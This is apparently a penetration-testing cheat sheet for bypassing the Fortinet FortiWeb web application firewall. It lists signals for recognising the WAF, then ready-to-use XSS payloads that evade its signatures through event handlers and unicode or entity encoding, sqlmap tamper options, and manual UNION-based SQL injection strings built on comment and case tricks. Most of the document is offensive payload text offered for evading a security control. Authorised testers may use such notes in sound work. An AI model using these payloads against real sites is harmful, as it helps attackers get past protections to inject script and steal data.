# Fortinet FortiWeb

### Detection Signals
| Signal | Where |
|--------|-------|
| `FORTIWAFSID=` cookie | Set on suspicious requests |
| `.fgd_icon` reference in page | Block page contains this image path |
| Block page: "Server Unavailable!" heading | 403/503 response body |
| Block page: "Server unavailable. Please visit later." | Response body text |
| `fortigate` or `fortiweb` in headers | Sometimes in Server/Via header |

### Bypass Strategy
- **Recommended tool**: Burp Suite for parameter manipulation, curl-cffi for requests.
- **Key weakness**: Signature-based. Comment injection and encoding chains work well.
- **HTTP/2**: FortiWeb inspection may be weaker on HTTP/2 frames.

### XSS Bypass
```
# FortiWeb blocks: standard XSS, event handlers, script tags
# Bypasses:
<details open ontoggle=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><mtext><img src=x onerror=alert(1)>

# Encoding chain:
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>
```

### SQLi Bypass
```
sqlmap --tamper=space2comment,charencode,between,randomcase -u URL

# Manual:
' /*!UNION*/ /*!SELECT*/ 1,2,3--
'%0aUNION%0aSELECT%0a1,2,3#
' uNiOn AlL sElEcT 1,2,3--
```

### Rate Limiting
- Configurable. Default moderate (~100 req/min).
- Block page shows incident reference.
- Recovery: depends on admin config (5-60 minutes).

---

